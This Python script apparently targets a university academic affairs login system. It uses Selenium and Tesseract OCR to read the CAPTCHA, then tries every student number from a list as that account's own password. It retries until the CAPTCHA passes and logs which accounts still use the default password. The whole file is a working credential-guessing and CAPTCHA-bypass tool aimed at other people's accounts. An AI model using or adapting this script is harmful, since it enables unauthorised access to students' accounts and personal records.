import time
import pytesseract
from PIL import Image, ImageEnhance
from selenium import webdriver
from selenium.webdriver.common.by import By
 
#教务系统url
url = ""

def work(user_data,pass_data):
    # 1、打开浏览器，最大化浏览器
    driver = webdriver.Firefox()
    driver.get(url)
    driver.implicitly_wait(40)
    driver.maximize_window()

    userElement = driver.find_element(By.XPATH, "/html/body/table/tbody/tr/td/table[3]/tbody/tr/td[2]/form/table/tbody/tr[2]/td/table/tbody/tr[1]/td[2]/input")
    passElement = driver.find_element(By.XPATH, "/html/body/table/tbody/tr/td/table[3]/tbody/tr/td[2]/form/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/input")
    codeElement = driver.find_element(By.XPATH, "/html/body/table/tbody/tr/td/table[3]/tbody/tr/td[2]/form/table/tbody/tr[2]/td/table/tbody/tr[3]/td[2]/input")

    # 2、截取屏幕内容，保存到本地
    driver.save_screenshot("./test/01.png")
    
    # 3、打开截图，获取验证码位置，截取保存验证码
    ran = Image.open("./test/01.png")
    box = (829, 495, 928, 519)  # 获取验证码位置,代表（左，上，右，下）
    ran.crop(box).save("./test/02.png")
    
    # 4、获取验证码图片，读取验证码
    imageCode = Image.open("./test/02.png")
    code = pytesseract.image_to_string(imageCode).strip().replace(" ","")
    # 5、收到验证码，进行输入验证
    
    userElement.send_keys(user_data)
    passElement.send_keys(pass_data)
    codeElement.send_keys(code)
    click_login = driver.find_element(By.XPATH, "//*[@id=\"btnSure\"]")
    click_login.click()
    time.sleep(0.01)

    try:
        title_data = driver.title
        if title_data.find('个人管理') != -1:
            print(user_data,'success')
            driver.close()
            return 0
        else:
            error_data = driver.find_element(By.XPATH, "/html/body/table/tbody/tr/td/table[3]/tbody/tr/td[2]/form/table/tbody/tr[1]/td/table/tbody/tr/td/table/tbody/tr[2]/td[2]/strong/font").text
            if error_data.find('验证码错误') != -1:
                driver.close()
                return 1
            elif error_data.find('密码不正确') != -1:
                print(user_data,'wrong')
                driver.close()
                return 2
            elif error_data.find('证件号') != -1:
                driver.close()
                return 3
    except Exception:
            print(user_data,'abnormal')
            driver.close()
            return 1

def main():
    i = 1
    sum = 0
    ans = ''
    file_out = open("./data/result.txt",'w+')
    with open("./data/xh.txt",'r') as file_in:
        for user in file_in.readlines():
            user = user.strip('\n')
            password = user
            print(i,end = ' ')
            i += 1
            ret = work(user,password)
            while ret == 1:
                ret = work(user,password)
            if ret == 0:
                sum += 1
                ans = 'correct'
            elif ret == 2:
                ans = 'wrong'
            elif ret == 3:
                ans = 'Number is wrong'
            print(user,ans,file=file_out)
    print('Use the default password persons:',sum,file=file_out)
    file_out.close()


if __name__ == "__main__":
    main()
else:
    pass
